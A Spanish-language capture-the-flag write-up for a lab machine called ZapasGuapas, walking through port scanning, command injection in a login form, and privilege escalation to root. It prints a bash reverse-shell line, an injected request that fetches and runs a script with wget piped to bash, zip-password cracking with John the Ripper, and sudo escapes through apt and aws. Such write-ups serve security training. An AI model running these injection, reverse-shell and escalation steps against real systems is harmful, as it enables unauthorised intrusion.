# Fase 1- Tanteo
![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/695ad784-90ce-4a3d-80ae-0f0161e5e692)
En esta fase inicial, realizamos un escaneo de puertos para identificar los servicios disponibles en la máquina objetivo. Utilizamos la herramienta Nmap con una serie de opciones para obtener información detallada y realizar un análisis exhaustivo de los puertos abiertos.
### Comando Nmap utilizado:

`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`

### Detalles del Comando:

- `sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`
- `-p-`: Escaneo de todos los puertos.
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Escaneo SYN para determinar el estado de los puertos.
- `-sC`: Activa detección de versiones y vulnerabilidades.
- `-sV`: Escaneo de versiones de servicios.
- `--min-rate 5000`: Velocidad mínima de escaneo.
- `-vvv`: Verbosidad muy alta para información detallada.
- `-n`: Desactiva la resolución de DNS.
- `-Pn`: Ignora la detección de hosts en línea.
- `192.168.52.139`: IP de la máquina objetivo.
- `-oN Escaneo`: Guarda resultados en archivo "Escaneo".

### Resultados:

#### Puertos Abiertos:

2.  **22/tcp(SSH):** OpenSSH 9.2p1
3. **80/tcp(HTTP):** Apache httpd 2.4.57

### Puerto 80
Al identificar que el puerto 80 estaba abierto durante el escaneo, se procedió a ingresar la dirección IP en el navegador. Se encontró una pagina llamada `ZapasGuapas` es tipo una tienda. 
![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/b2ce8d08-2fe3-453d-9b53-393065a99978)

# Fase 2- Exploración

#### FeroxBuster
![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/5a437d5c-a950-4a68-ac51-43cd9ea661fe)
Encontró muchísimas cosas, pero me fije particularmente en un `login.html`.

![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/90d52b0d-7191-4ece-a932-ce5e4cf71e27)

Es un panel de inicio de sesión bastante feo.

![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/959808f9-8640-47ca-a3cb-d0d3f946d8ec)
Si revisamos el codigo vemos esto... El formulario de inicio de sesión envía los datos del usuario a un archivo `run_command.php` utilizando una solicitud `GET`. Podríamos intentar inyectar comandos maliciosos a través de los parámetros `username` y `password`.

# Fase 3- Explotación

#### GET
![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/7a875947-7fe3-4b83-b8fb-2b18ce9d02df)

Capturamos la petición utilizando la herramienta Burpsuite.

![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/5c614c64-5617-4b06-8a68-54d84c4848d7)
En el lugar de la `password` coloque un `ls` y funciono! Tenemos un RCE.

![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/5ea07eb0-50af-4145-8cde-959134aa3cbe)

Creamos en nuestra maquina atacante un archivo llamado `shell.sh` con el siguiente contenido:
```r
/bin/bash -i >& /dev/tcp/192.168.1.2/443 0>&1
```

![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/7565d212-d505-421d-ad40-ec761a7e7684)

Abrimos una pagina web por el puerto 80 con python.
Y en burpsuite le enviamos lo siguiente:
```r
GET /run_command.php?username=admin&password=wget+-O+-+192.168.1.2/shell.sh+|bash HTTP/1.1
Host: 192.168.1.7
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: */*
Sec-GPC: 1
Accept-Language: es-419,es
Referer: http://192.168.1.7/login.html
Accept-Encoding: gzip, deflate, br
Connection: close
```

![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/3a149441-e9b3-45f4-b092-595ecdfbf46d)

Y listo! Estamos dentro!

# Fase 4- Privilegios

#### sudo -l
![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/b0546b54-c0bc-45cc-a138-2ba2f31b0c9b)

Despues de realizar el tratamiento de la TTY y no ver ningún binario que pueda ser usado empiezo a explorar la maquina y en el directorio `/opt` encuentro un `.zip`.
Vamos a pasárnoslo a nuestra maquina de esta forma:
```python
www-data@zapasguapas:/opt$ base64 -w0 importante.zip ;echo
UE.....
> echo "UE...." | base64 -d -w0 > importante.zip
```
El comando toma el archivo "importante.zip" en el directorio "/opt", lo convierte a formato base64 sin saltos de línea.

![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/96207b12-da30-4406-b340-2147b36208f4)

Y ya lo tenemos en nuestra maquina atacante.

![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/a7916a71-a6f5-4d08-9457-300c8dfe4fcb)

```python
> zip2john importante.zip > hash
> john --wordlist=/usr/share/wordlists/rockyou.txt hash
hotstuff         (importante.zip/password.txt)     
❯ unzip importante.zip
Archive:  importante.zip
 [importante.zip] password.txt password: hotstuff 
  inflating: password.txt
at password.txt
> cat password.txt

   1   │ He conseguido la contraseña de pronike. Adidas FOREVER!!!!
   2   │ 
   3   │ pronike11
```
El comando primero convierte el archivo "importante.zip" en un formato compatible con John the Ripper y guarda el resultado en un archivo llamado "hash". Luego, utilizamos John the Ripper para descifrar la contraseña del archivo utilizando un diccionario de contraseñas. Una vez que encuentra la contraseña, "hotstuff", descomprime el archivo y vemos la contraseña del usuario pronike, pronike11.


```python
❯ ssh pronike@192.168.1.7
The authenticity of host '192.168.1.7 (192.168.1.7)' can't be established.
ED25519 key fingerprint is SHA256:anWz9eEaTk4hI9Cn5nHeYg/yvQJE6szOEXzIsjaYQIs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.1.7' (ED25519) to the list of known hosts.
pronike@192.168.1.7's password: 
Linux zapasguapas 6.1.0-20-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.85-1 (2024-04-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
pronike@zapasguapas:~$ id                                                                                                                                                                                  
uid=1002(pronike) gid=1002(pronike) grupos=1002(pronike)
pronike@zapasguapas:~$ 
```
Y nos conectamos por ssh al usuario pronike.

#### pronike
![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/d367ba67-a1c8-4beb-b526-052b50c1ddf7)
Despues de realizar el tratamiento de la TTY, vemos que podemos ejecutar el binario `apt` como el usuario `proadidas`. Para escalar privilegios con este binario se haría de la siguiente forma:
```python
pronike@zapasguapas:~$ sudo -u proadidas /bin/apt changelog apt
!/bin/bash
```

![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/24eae865-f27c-4067-94a2-290a87309fd4)

Y ya somos el usuario proadidas!

#### Proadidas
![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/b3505679-a5cd-4f91-97fc-8aeb5ba5b9db)
Podemos ejecutar el binario `aws` como el usuario `root`. La escalada se haría de la siguiente forma:
```r
sudo aws help
!/bin/bash
```

![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/66164ff0-0149-4a9a-b74f-c96c952cd42c)

Maquina finalizada como usuario root!.





